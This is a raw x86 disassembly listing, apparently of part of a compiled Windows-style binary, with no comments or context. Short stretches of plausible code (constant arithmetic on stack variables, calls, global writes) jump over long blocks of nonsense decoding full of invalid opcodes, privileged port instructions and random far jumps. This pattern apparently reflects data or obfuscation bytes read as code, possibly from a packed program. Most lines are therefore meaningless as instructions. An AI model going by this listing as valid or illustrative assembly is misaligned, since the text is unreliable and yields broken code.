  412156:	sub    ebp,DWORD PTR [ebp+0x7e685338]
  41215c:	dec    esp
  41215d:	sar    DWORD PTR [eax-0x7575e9a6],cl
  412163:	add    bh,BYTE PTR ds:0x23f812b8
  412169:	dec    esi
  41216a:	add    eax,0x1b4e9744
  41216f:	sub    esi,DWORD PTR [eax-0x2c]
  412172:	xchg   ah,al
  412174:	rol    BYTE PTR [edi+0x6c50fcb8],cl
  41217a:	mov    DWORD PTR [ecx-0x7a],ebx
  41217d:	cs pop es
  41217f:	add    ah,0x9c
  412182:	lock cmp DWORD PTR ds:0x8f77055b,eax
  412189:	pop    esi
  41218a:	push   edi
  41218b:	xor    dl,BYTE PTR [ecx]
  41218d:	rol    ebp,0xe1
  412190:	pop    ebx
  412191:	cld    
  412192:	lahf   
  412193:	daa    
  412194:	xchg   edx,eax
  412195:	jns    0x41220b
  412197:	pop    eax
  412198:	inc    esp
  412199:	cmp    ch,BYTE PTR es:[eax-0x7d673597]
  4121a0:	xchg   cl,bl
  4121a2:	lods   eax,DWORD PTR ds:[esi]
  4121a3:	push   eax
  4121a4:	cwde   
  4121a5:	mov    dh,0xae
  4121a7:	(bad)  
  4121a8:	jmp    0xf509:0x82629de9
  4121af:	fxch   st(3)
  4121b1:	mov    eax,0x8bf597bf
  4121b6:	cmp    ebx,DWORD PTR [ebx]
  4121b8:	lock addr16 aad 0x7f
  4121bc:	xor    ah,ah
  4121be:	sbb    DWORD PTR [ecx-0x5e],edx
  4121c1:	cmc    
  4121c2:	pop    ss
  4121c3:	dec    ebx
  4121c4:	and    al,0xdf
  4121c6:	jbe    0x4121c4
  4121c8:	push   ebx
  4121c9:	jecxz  0x412231
  4121cb:	jb     0x4121c4
  4121cd:	inc    eax
  4121ce:	and    ebp,ebx
  4121d0:	in     al,dx
  4121d1:	pusha  
  4121d2:	addr16 adc al,0x44
  4121d5:	imul   esi,DWORD PTR [ebx-0x5c981faa],0x45
  4121dc:	stos   DWORD PTR es:[edi],eax
  4121dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121de:	adc    DWORD PTR [ebx],esp
  4121e0:	add    al,0x9e
  4121e2:	pop    es
  4121e3:	sbb    cl,BYTE PTR [esi+0x44]
  4121e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e7:	or     ch,ah
  4121e9:	cmp    DWORD PTR [esi],esi
  4121eb:	sub    eax,0x8c4ee31f
  4121f0:	mov    al,ds:0xa08bde74
  4121f5:	mov    bl,0xca
  4121f7:	cs call 0xaa51b548
  4121fd:	or     DWORD PTR [edi+0xa],ebp
  412200:	adc    eax,0xb106a123
  412205:	xlat   BYTE PTR ds:[ebx]
  412206:	xchg   ecx,eax
  412207:	and    eax,DWORD PTR [esp+ebx*8+0x68ffd463]
  41220e:	and    BYTE PTR [ebx-0x3d],bh
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x42262c
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	and    esp,ecx
  4122a3:	mov    esi,DWORD PTR [eax-0x2]
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	xchg   edi,eax
  4122ae:	cmp    ah,ch
  4122b0:	cs jb  0x4122ab
  4122b3:	cmp    al,0x57
  4122b5:	mov    al,0x4b
  4122b7:	adc    BYTE PTR [eax+0x2d],dl
  4122ba:	in     eax,0xd5
  4122bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122bd:	and    esp,DWORD PTR [ebp+0x7a]
  4122c0:	push   ds
  4122c1:	daa    
  4122c2:	xchg   ecx,eax
  4122c3:	out    0x43,eax
  4122c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c6:	dec    esp
  4122c7:	and    dh,0x39
  4122ca:	cmc    
  4122cb:	arpl   WORD PTR [ebp+0x1675dcb0],bx
  4122d1:	mov    esp,0xe4f115cc
  4122d6:	loope  0x41229d
  4122d8:	js     0x41232a
  4122da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122dc:	in     al,0xe1
  4122de:	in     al,dx
  4122df:	shl    dl,1
  4122e1:	push   esp
  4122e2:	addr16 out 0x39,al
  4122e5:	stc    
  4122e6:	mov    DWORD PTR [bx],edi
  4122e9:	push   ss
  4122ea:	(bad)  
  4122ec:	test   DWORD PTR [esi-0x31],edx
  4122ef:	mov    edi,0x89c2e555
  4122f4:	mov    WORD PTR [ecx],?
  4122f6:	sub    BYTE PTR gs:[edx-0x15],0xee
  4122fb:	stos   DWORD PTR es:[edi],eax
  4122fc:	push   ebx
  4122fd:	ds js  0x412291
  412300:	mov    ebx,0xcd82ffd6
  412305:	mov    ch,0xfd
  412307:	push   cs
  412308:	jb     0x412294
  41230a:	add    DWORD PTR [edx+ebx*8],0x72
  41230e:	daa    
  41230f:	mov    dl,0xcc
  412311:	mov    dl,0xb8
  412313:	cs push 0xffffffda
  412316:	dec    eax
  412317:	ins    DWORD PTR es:[edi],dx
  412318:	mov    ss,ebp
  41231a:	mov    esi,0xcfec7267
  41231f:	inc    esi
  412320:	cmc    
  412321:	rcr    DWORD PTR [ebx],cl
  412323:	or     edi,edx
  412325:	xor    dl,bh
  412327:	imul   ecx,DWORD PTR [eax+0x2a],0xb94f543d
  41232e:	inc    ecx
  41232f:	stc    
  412330:	call   DWORD PTR ds:0xc173261e
  412336:	nop
  412337:	out    dx,eax
  412338:	dec    esp
  412339:	mov    ch,0x14
  41233b:	mov    esp,ebp
  41233d:	rcl    BYTE PTR [esi+0x8],1
  412340:	nop
  412341:	adc    ecx,DWORD PTR [edi-0x69]
  412344:	aam    0xfd
  412346:	jbe    0x412309
  412348:	pop    esi
  412349:	in     al,dx
  41234a:	dec    esp
  41234b:	and    al,0x3c
  41234d:	dec    ecx
  41234e:	das    
  41234f:	xor    DWORD PTR [ecx],ebp
  412351:	and    ch,ch
  412353:	scas   eax,DWORD PTR es:[edi]
  412354:	inc    eax
  412355:	nop
  412356:	loopne 0x4123b6
  412358:	(bad)  [eax+eax*8-0x4a04ede6]
  41235f:	xor    eax,0x5ee8fee2
  412364:	aam    0x11
  412366:	mov    cl,0x9c
  412368:	mov    dh,0x16
  41236a:	rol    DWORD PTR [ebx],0xfc
  41236d:	push   edx
  41236e:	xchg   DWORD PTR [eax-0x43],ebp
  412371:	adc    BYTE PTR ds:0x886e9c24,ah
  412377:	das    
  412378:	popf   
  412379:	sub    DWORD PTR [esi-0x36],edx
  41237c:	aam    0xa0
  41237e:	lea    edx,gs:[edx+0x726fb66d]
  412385:	pop    edi
  412386:	dec    edx
  412387:	inc    ecx
  412388:	push   eax
  412389:	ret    0xe79e
  41238c:	(bad)  [ebx+ebx*2]
  41238f:	dec    eax
  412390:	mov    cl,0xb0
  412392:	ficomp WORD PTR [esi-0x10]
  412395:	pop    edi
  412396:	pop    ebx
  412397:	adc    BYTE PTR [eax-0x237561e9],dh
  41239d:	mov    al,ds:0x6c48332
  4123a2:	add    al,dl
  4123a4:	mov    ecx,0xf878c6cd
  4123a9:	ins    DWORD PTR es:[edi],dx
  4123aa:	cmp    eax,DWORD PTR [edx+0x69]
  4123ad:	dec    esp
  4123ae:	fsubr  DWORD PTR [esi-0x2d716c02]
  4123b4:	sbb    al,BYTE PTR [ebx-0x1f]
  4123b7:	pop    ebp
  4123b8:	push   edx
  4123b9:	add    dl,ch
  4123bb:	(bad)  
  4123bc:	das    
  4123bd:	daa    
  4123be:	xor    eax,0xf3c12d0e
  4123c3:	int    0xf9
  4123c5:	mov    dl,0xc5
  4123c7:	and    DWORD PTR [edx],ebx
  4123c9:	push   ebp
  4123ca:	ins    BYTE PTR es:[edi],dx
  4123cb:	jno    0x4123f4
  4123cd:	mov    eax,0xb65f52f3
  4123d2:	mov    eax,ds:0xd9011384
  4123d7:	pop    edi
  4123d8:	stos   BYTE PTR es:[edi],al
  4123d9:	and    eax,0x32ae6d0b
  4123de:	cli    
  4123df:	mov    ecx,DWORD PTR [esi+0x3a]
  4123e2:	adc    BYTE PTR [ebx+ecx*4-0xe],dl
  4123e6:	pop    edx
  4123e7:	pop    ebp
  4123e8:	lods   eax,DWORD PTR ds:[esi]
  4123e9:	cmp    BYTE PTR [ecx-0x7e307eba],dl
  4123ef:	inc    ebp
  4123f0:	retf   0x7360
  4123f3:	pop    esp
  4123f4:	mov    ah,0x6
  4123f6:	dec    esi
  4123f7:	inc    ebp
  4123f8:	mov    ds:0xcca45f6b,al
  4123fd:	mov    dl,0x2a
  4123ff:	nop    DWORD PTR [eax-0x42]
  412403:	inc    edx
  412404:	mov    bl,0xda
  412406:	push   0xffffffb9
  412408:	pop    ebp
  412409:	push   0xffffffe9
  41240b:	sar    edx,0xc6
  41240e:	loop   0x4123a2
  412410:	push   0x3d46cd8e
  412415:	dec    eax
  412416:	fidiv  DWORD PTR cs:[ebx-0xccb67b3]
  41241d:	inc    esi
  41241e:	fisttp DWORD PTR [ecx*4+0x8c006d]
  412425:	adc    esi,DWORD PTR [edi]
  412427:	pop    ebp
  412428:	pop    ebp
  412429:	cmp    BYTE PTR [edx+ecx*2+0x2f],ah
  41242d:	xor    ebp,DWORD PTR [edi]
  41242f:	(bad)  
  412430:	cli    
  412431:	jecxz  0x41246c
  412433:	sbb    bh,BYTE PTR [ecx+0x57]
  412436:	sbb    eax,0x2f553fbf
  41243b:	jo     0x412405
  41243d:	pusha  
  41243e:	test   al,0x4d
  412440:	retf   
  412441:	mov    al,ds:0x8b7ce89c
  412446:	xchg   ebx,eax
  412447:	sub    BYTE PTR [ebp+0x1f3325b4],bl
  41244d:	fist   WORD PTR [edx+0x11]
  412450:	int3   
  412451:	cwde   
  412452:	adc    DWORD PTR [eax-0x15d8219d],eax
  412458:	in     al,dx
  412459:	pop    esp
  41245a:	fs jo  0x4124b8
  41245d:	out    dx,al
  41245e:	mov    WORD PTR ds:0x4259c313,es
  412464:	pop    esi
  412465:	xchg   ebx,ebp
  412467:	popf   
  412468:	ja     0x41249d
  41246a:	inc    ecx
  41246b:	and    eax,0x370ad4d3
  412470:	cdq    
  412471:	jl     0x4124e3
  412473:	sub    dh,BYTE PTR ss:[edx+0x687e945e]
  41247a:	repnz not BYTE PTR [eax-0x4835bee3]
  412481:	int3   
  412482:	hlt    
  412483:	enter  0x8a00,0x48
  412487:	xchg   BYTE PTR [edi-0x7a29fc55],cl
  41248d:	data16 jg 0x4124bc
  412490:	mov    eax,ds:0xbfa47068
  412495:	pop    es
  412496:	out    dx,al
  412497:	pop    ebp
  412498:	pushaw 
  41249a:	scas   eax,DWORD PTR es:[edi]
  41249b:	mov    ch,0xb1
  41249d:	fcom   st(6)
  41249f:	cmp    al,0xae
  4124a1:	inc    ebx
  4124a3:	sub    BYTE PTR [ebp+0x75],bl
  4124a6:	cs cmp al,0x10
  4124a9:	and    esi,DWORD PTR [edx+0x7f]
  4124ac:	mov    bh,0xba
  4124ae:	fucomp st(7)
  4124b0:	repz dec edx
  4124b2:	mov    cs,WORD PTR [ecx+0x7b]
  4124b5:	lods   eax,DWORD PTR ds:[esi]
  4124b6:	repnz inc ebx
  4124b8:	hlt    
  4124b9:	fist   DWORD PTR [edi]
  4124bb:	xchg   ebp,eax
  4124bc:	push   0x5a88ed7e
  4124c1:	dec    ebx
  4124c2:	dec    eax
  4124c3:	pop    ecx
  4124c4:	mov    BYTE PTR [eax],bl
  4124c6:	ret    0x5af4
  4124c9:	out    dx,al
  4124ca:	inc    ebx
  4124cb:	mov    BYTE PTR [eax-0x43],bh
  4124ce:	mov    dl,0xb2
  4124d0:	inc    ebp
  4124d1:	xchg   edx,eax
  4124d2:	pusha  
  4124d3:	sbb    al,ah
  4124d5:	and    DWORD PTR [esp+esi*2],edx
  4124d8:	imul   eax,ebp,0x61fe20d4
  4124de:	jp     0x412531
  4124e0:	mov    ch,0xa2
  4124e2:	jne    0x4124d3
  4124e4:	sbb    DWORD PTR [ebx+0x1ea07061],ebx
  4124ea:	jnp    0x412524
  4124ec:	push   eax
  4124ed:	into   
  4124ee:	rcl    DWORD PTR [ecx],1
  4124f0:	test   esi,0xaf4827a4
  4124f6:	xchg   BYTE PTR [edi+0x162a3fe4],bl
  4124fc:	fidivr DWORD PTR [ebx+0x69]
  4124ff:	xchg   ecx,eax
  412500:	fild   WORD PTR gs:[eax+0x7b]
  412504:	stos   DWORD PTR es:[edi],eax
  412505:	add    edx,eax
  412507:	adc    esi,ecx
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x4220b1
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x41256a
  412538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412539:	xchg   ecx,eax
  41253a:	jo     0x412593
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	push   edi
  412544:	daa    
  412545:	in     al,dx
  412546:	cs jmp 0x85d2:0xc528d342
  41254e:	or     BYTE PTR [ebp+0x6],ch
  412551:	push   ss
  412552:	test   DWORD PTR [ecx+esi*8],eax
  412555:	cs pop ebx
  412557:	scas   eax,DWORD PTR es:[edi]
  412558:	cmp    esp,edi
  41255a:	jl     0x4125d6
  41255c:	mov    cl,0xb1
  41255e:	and    bh,BYTE PTR [ebx]
  412560:	adc    eax,0x87a8dc87
  412565:	fadd   QWORD PTR ds:0x3604b7ae
  41256b:	in     al,0x39
  41256d:	call   0xa28d:0x29ee2194
  412574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412575:	mov    bh,0xf1
  412577:	into   
  412578:	aam    0x33
  41257a:	cmp    BYTE PTR [esi],al
  41257c:	xor    al,0x6a
  41257e:	pop    es
  41257f:	mov    ebp,0x7d5b34f3
  412584:	ret    
  412585:	(bad)  
  412586:	aad    0xe2
  412588:	xchg   ebx,eax
  412589:	add    eax,0x2bbd0284
  41258e:	pusha  
  41258f:	mov    ds:0x5322b5b2,al
  412594:	sub    al,bl
  412596:	mov    ah,0x68
  412598:	dec    esi
  412599:	inc    esi
  41259a:	cmp    al,0x67
  41259c:	xchg   esi,eax
  41259d:	and    DWORD PTR [ebp-0x55185708],eax
  4125a3:	mov    al,0x18
  4125a5:	inc    edi
  4125a6:	fbstp  TBYTE PTR [ebp+0x35a26e9a]
  4125ac:	jp     0x412621
  4125ae:	loop   0x41254c
  4125b0:	inc    ebx
  4125b1:	or     ah,BYTE PTR [ecx-0x31]
  4125b4:	je     0x412553
  4125b6:	call   0xb4aac9c5
  4125bb:	ins    BYTE PTR es:[edi],dx
  4125bc:	mov    ch,0x54
  4125be:	inc    ecx
  4125bf:	xchg   eax,eax
  4125c1:	ins    DWORD PTR es:[edi],dx
  4125c2:	out    0xa2,al
  4125c4:	push   ds
  4125c5:	cmp    al,0x28
  4125c7:	or     BYTE PTR [eax+0x3a5bd8f2],al
  4125cd:	pop    esp
  4125ce:	push   ebx
  4125d0:	fidivr DWORD PTR [ebp+0x241357fc]
  4125d6:	enter  0xdb1c,0x84
  4125da:	mov    ds:0x75119cd4,al
  4125df:	daa    
  4125e0:	inc    edx
  4125e1:	out    dx,al
  4125e2:	push   es
  4125e3:	test   BYTE PTR [edi+0x270c3c16],cl
  4125e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ea:	test   al,0xe3
  4125ec:	jl     0x4125f0
  4125ee:	gs mov ch,0xb8
  4125f1:	cmp    edx,eax
  4125f3:	mov    bl,0xea
  4125f5:	pop    edx
  4125f6:	or     edi,0x81eb4164
  4125fc:	push   cs
  4125fd:	sub    esp,DWORD PTR gs:[eax-0x12]
  412601:	push   esp
  412602:	sub    BYTE PTR [ebp-0x615e16c3],ah
  412608:	add    BYTE PTR [eax+ecx*2-0x3],ah
  41260c:	dec    ecx
  41260d:	arpl   WORD PTR [ecx+0x75],dx
  412610:	ins    BYTE PTR es:[edi],dx
  412611:	imul   ebx,ebx,0x53ae90fd
  412617:	cmp    BYTE PTR [edx],cl
  412619:	xchg   ecx,eax
  41261a:	cmp    cl,bh
  41261c:	mov    ch,0xe7
  41261e:	ret    
  41261f:	jp     0x290d219
  412625:	and    dl,BYTE PTR [edx+0x505f2d44]
  41262b:	cdq    
  41262c:	out    0xeb,al
  41262e:	jb     0x412675
  412630:	(bad)  
  412631:	jge    0x412626
  412633:	bound  eax,QWORD PTR [edi]
  412635:	adc    eax,0x7b507414
  41263a:	jmp    0xee494f2b
  41263f:	iret   
  412640:	lahf   
  412641:	jns    0x4126b8
  412643:	mov    bl,0xb5
  412645:	(bad)  
  412646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412647:	xchg   BYTE PTR [ebx],bl
  412649:	jmp    DWORD PTR [esi+0xc]
  41264c:	jp     0x4125d7
  41264e:	div    DWORD PTR [ecx+0x6b280403]
  412654:	adc    edx,ecx
  412656:	cld    
  412657:	xor    ecx,DWORD PTR [eax+esi*2-0x1e6263f9]
  41265e:	lock xchg DWORD PTR [ecx+0x1ce3382],ecx
  412665:	iret   
  412666:	bound  edx,QWORD PTR [ebp-0x47]
  412669:	fs xchg ebx,eax
  41266b:	add    BYTE PTR [edi],dl
  41266d:	add    al,0xd3
  41266f:	outs   dx,BYTE PTR ds:[esi]
  412670:	dec    edx
  412671:	imul   ebp,DWORD PTR [edi+ebx*1-0x7968e5d3],0xffffffa7
  412679:	fisttp WORD PTR [ebx+0x36e703b9]
  41267f:	fwait
  412680:	rcl    DWORD PTR [edi+0x15],0x35
  412684:	fstp   QWORD PTR [eax-0x64]
  412687:	loop   0x4126c5
  412689:	adc    DWORD PTR cs:0xc206c395,edi
  412690:	stos   BYTE PTR es:[edi],al
  412691:	shl    DWORD PTR [eax],0x14
  412694:	outs   dx,DWORD PTR ds:[esi]
  412695:	push   edx
  412696:	adc    bh,BYTE PTR [ebx-0x4a]
  412699:	cmp    ah,al
  41269b:	pop    edi
  41269c:	out    dx,eax
  41269d:	jb     0x4126de
  41269f:	push   ss
  4126a0:	sar    esp,1
  4126a2:	mov    ebx,eax
  4126a4:	lds    edi,FWORD PTR [ebx]
  4126a6:	push   ebp
  4126a7:	in     al,dx
  4126a8:	xchg   ebp,eax
  4126a9:	in     al,0xa2
  4126ab:	mov    cl,0x1e
  4126ad:	cld    
  4126ae:	xchg   esp,eax
  4126af:	cmp    dh,bh
  4126b1:	stc    
  4126b2:	scas   al,BYTE PTR es:[edi]
  4126b3:	jmp    0x4126a3
  4126b5:	xchg   edx,eax
  4126b6:	aas    
  4126b7:	and    esi,esp
  4126b9:	mov    al,0xb8
  4126bb:	sub    cl,0x54
  4126be:	xor    BYTE PTR [eax+eax*1],al
  4126c1:	add    bh,BYTE PTR [ebx]
  4126c3:	clc    
  4126c4:	push   edx
  4126c5:	mov    bl,0x63
  4126c7:	lock mov DWORD PTR [edx],eax
  4126ca:	mov    ds:0xd40a7341,al
  4126cf:	shl    DWORD PTR [ebp-0x572361b3],1
  4126d5:	test   al,0x5b
  4126d7:	sub    BYTE PTR [ecx],0x14
  4126da:	pop    ds
  4126db:	fiadd  DWORD PTR [edi+0x69]
  4126de:	out    0x14,al
  4126e0:	adc    cl,BYTE PTR [ecx+0x7a]
  4126e3:	pop    ss
  4126e4:	lock scas al,BYTE PTR es:[edi]
  4126e6:	mov    ds:0xde1b826c,al
  4126eb:	ficom  WORD PTR [ecx+0x190acdfc]
  4126f1:	retf   0x1004
  4126f4:	loop   0x4126e0
  4126f6:	mov    ah,0xab
  4126f8:	adc    BYTE PTR ds:0xc3a79d71,al
  4126fe:	inc    esi
  4126ff:	repnz sub BYTE PTR [esi-0x23],cl
  412703:	ds cwde 
  412705:	or     BYTE PTR [ecx+ecx*8],bl
  412708:	mov    edi,DWORD PTR [ebp+eax*2-0xd656f8]
  41270f:	add    ecx,edx
  412711:	mov    ecx,0x1dbc4414
  412716:	push   edi
  412717:	mov    dl,BYTE PTR [esi+0x2fe53d1a]
  41271d:	xchg   ebx,eax
  41271e:	or     dh,BYTE PTR [edi]
  412720:	stos   BYTE PTR es:[edi],al
  412721:	js     0x412798
  412723:	xor    al,0x39
  412725:	add    DWORD PTR [edx-0x587a4389],0xf9f3815c
  41272f:	rcr    BYTE PTR [eax-0x63],1
  412732:	jl     0x412712
  412734:	imul   esp,DWORD PTR ds:0xed45c311,0xa59e96e
  41273e:	daa    
  41273f:	mov    ah,0x11
  412741:	cmp    BYTE PTR [ebp+0x5f0dcc74],ch
  412747:	call   0x8c27:0xac7f7716
  41274e:	cmp    al,0x2e
  412750:	sbb    esi,DWORD PTR [edx]
  412752:	into   
  412753:	mov    esp,edx
  412755:	(bad)  
  412756:	mov    eax,0x2e891222
  41275b:	pop    es
  41275c:	pandn  mm7,mm1
  41275f:	fsubr  st(0),st
  412761:	inc    BYTE PTR [bp+di]
  412764:	out    0x34,al
  412766:	pop    ss
  412767:	ret    0xb14d
  41276a:	fild   QWORD PTR [ebx+ebx*2+0x3c]
  41276e:	daa    
  41276f:	push   esp
  412770:	mov    al,0x54
  412772:	jge    0x412783
  412774:	popa   
  412775:	repnz dec edi
  412777:	or     al,0x2a
  412779:	inc    edi
  41277a:	adc    eax,0xe151577a
  41277f:	dec    ebx
  412780:	jmp    0x412736
  412782:	and    eax,0xc7db82f6
  412787:	or     al,0x37
  412789:	push   edi
  41278a:	xchg   edi,eax
  41278b:	shl    BYTE PTR [edx],cl
  41278d:	adc    eax,0x1a288fdb
  412792:	and    DWORD PTR [edi+0x1bd1df75],0x1b7e400e
  41279c:	ret    0x158b
  41279f:	sub    al,0x26
  4127a1:	inc    edx
  4127a2:	add    BYTE PTR [ebx],dh
  4127a4:	idiv   BYTE PTR [ebx]
  4127a6:	ror    DWORD PTR [edi],1
  4127a8:	test   DWORD PTR ds:0x3b000000,ebp
  4127ae:	lock jne 0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x42262c
  4127d5:	mov    ds:0x422634,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0x708f3b9d
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [edi-0x2b],ch
  4128b4:	repnz cs nop
  4128b7:	pop    es
  4128b8:	and    DWORD PTR [ecx+0x3cf11b5e],eax
  4128be:	inc    edx
  4128bf:	lock imul ebp,edx,0x3090c1ea
  4128c6:	mov    ah,0x43
  4128c8:	add    BYTE PTR [edx+ecx*8-0x5adc71d5],bh
  4128cf:	inc    esp
  4128d0:	push   es
  4128d1:	pop    ss
  4128d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128d3:	mov    DWORD PTR [edx+0x44d297d7],edx
  4128d9:	xchg   esi,eax
  4128da:	dec    esi
  4128db:	mov    BYTE PTR [edi],bl
  4128dd:	xor    al,0xb3
  4128df:	pop    esp
  4128e0:	loopne 0x4128ac
  4128e2:	sbb    dh,bl
  4128e4:	and    eax,0x1b3cb91
  4128e9:	jmp    0x412935
  4128eb:	xlat   BYTE PTR ds:[ebx]
  4128ec:	std    
  4128ed:	repz test DWORD PTR [edx+edx*4+0x6b36ff32],ebx
  4128f5:	mov    al,ds:0x5fa0d87f
  4128fa:	sar    DWORD PTR [esi+0x365c5f95],1
  412900:	dec    ebx
  412901:	outs   dx,BYTE PTR ds:[esi]
  412902:	enter  0xcae0,0xb2
  412906:	mov    eax,ds:0x3b00ff7f
  41290b:	jge    0x4128bc
  41290d:	lods   al,BYTE PTR ds:[esi]
  41290e:	adc    BYTE PTR [edi-0x5ff8d0b5],0xef
  412915:	or     eax,0x93d4065d
  41291a:	and    BYTE PTR [edx+ecx*8-0x397f8826],bh
  412921:	inc    esi
  412922:	add    esp,DWORD PTR [ebp-0x3f5bba50]
  412928:	and    BYTE PTR [ebp-0x76],bh
  41292b:	mov    edx,0x4e67976a
  412930:	leave  
  412931:	out    0x23,al
  412933:	pop    ecx
  412934:	mov    edi,0x2b91f9cd
  412939:	gs lock adc esp,edx
  41293d:	shr    eax,cl
  41293f:	xchg   esp,eax
  412940:	in     al,0x9e
  412942:	xchg   BYTE PTR [edi+0x5],al
  412945:	fadd   st,st(1)
  412947:	jg     0x41296b
  412949:	inc    esp
  41294a:	or     esi,ecx
  41294c:	loop   0x41298f
  41294e:	pop    ecx
  41294f:	push   ecx
  412950:	cli    
  412951:	(bad)  
  412952:	or     DWORD PTR [ebx+edi*2],0xffffffd8
  412956:	retf   0x302c
  412959:	popf   
  41295a:	or     eax,0xfa54bf08
  41295f:	aad    0x5a
  412961:	pop    es
  412962:	jne    0x412927
  412964:	(bad)  
  412965:	int    0xdd
  412967:	push   0xc31501b9
  41296c:	cmp    BYTE PTR [ebx-0x5f],cl
  41296f:	add    eax,0x4e84097
  412974:	fwait
  412975:	sahf   
  412976:	repnz pop ecx
  412978:	adc    esp,DWORD PTR [eax]
  41297a:	clc    
  41297b:	les    ebx,FWORD PTR [ebx]
  41297d:	out    dx,eax
  41297e:	addr16 into 
  412980:	in     al,0xb9
  412982:	sub    esp,0xea95b824
  412988:	pop    ebp
  412989:	dec    edx
